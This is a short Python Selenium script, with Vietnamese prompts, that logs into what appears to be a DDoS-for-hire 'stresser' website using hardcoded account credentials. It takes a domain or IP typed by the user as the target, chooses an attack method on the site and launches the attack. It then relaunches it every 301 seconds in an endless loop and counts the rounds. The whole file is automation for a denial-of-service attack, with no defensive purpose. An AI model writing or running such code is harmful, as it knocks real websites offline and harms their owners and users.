import selenium
from selenium import webdriver
import time
import keyboard
import os,sys
link=input("Nhập Domain Hoặc IP: ")
options=webdriver.ChromeOptions()
options.add_argument("--incognito")
driver=webdriver.Chrome(options=options)
driver.get('https://cryptostresser.com/login')
driver.find_element_by_xpath('/html/body/div[2]/section/div/div/div/div/div[4]/form/div[1]/input').send_keys('taikhoan01')
driver.find_element_by_xpath('/html/body/div[2]/section/div/div/div/div/div[4]/form/div[2]/input').send_keys('taikhoan01')
driver.find_element_by_xpath('/html/body/div[2]/section/div/div/div/div/div[4]/form/div[3]/button').click()
driver.find_element_by_xpath('/html/body/div[2]/div/div[2]/aside/ul/li[3]/a').click()
driver.find_element_by_xpath('/html/body/div[2]/div/div[5]/section/div/div/div[1]/div/div[2]/form/div[1]/input').send_keys(f"https://{link}")
driver.find_element_by_xpath('//*[@id="attack_methods"]').click()
keyboard.press_and_release('down')
keyboard.press_and_release('enter')
driver.find_element_by_xpath('/html/body/div[2]/div/div[5]/section/div/div/div[1]/div/div[2]/form/button').click()
time.sleep(2)
driver.find_element_by_xpath('/html/body/div[10]/div/div[4]/div/button').click()
keyboard.press_and_release('windows+down')
os.system("cls")
print('Lần 1')
a=1
while True:
 time.sleep(301)
 driver.find_element_by_xpath('/html/body/div[2]/div/div[5]/section/div/div/div[1]/div/div[2]/form/button').click()
 time.sleep(2)
 driver.find_element_by_xpath('/html/body/div[10]/div/div[4]/div/button').click()
 os.system("cls")
 a=a+1
 print(f"Lần {a}")

